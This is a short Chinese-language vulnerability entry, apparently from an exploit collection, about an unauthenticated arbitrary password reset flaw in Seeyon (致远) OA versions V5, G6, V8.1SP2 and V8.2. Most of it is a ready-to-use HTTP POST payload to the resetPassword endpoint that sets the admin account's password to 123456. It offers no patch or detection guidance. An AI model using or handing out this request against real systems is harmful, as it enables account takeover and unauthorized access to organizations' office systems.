### 漏洞描述：

致远OA存在任意用户密码重置漏洞，未经授权的远程攻击者在获取到用户名的情况下即可通过向特定接口发送HTTP请求来触发任意用户密码重置，最终可导致任意用户登录。

### 影响版本：

致远OA=V5  

致远OA=G6  

致远OA=V8.1SP2  

致远OA=V8.2  

### Payload：
```jsx
POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
Host: Host
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.667.76 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/json
Content-Length: 43

{"loginName":"admin","password":"123456"}
```
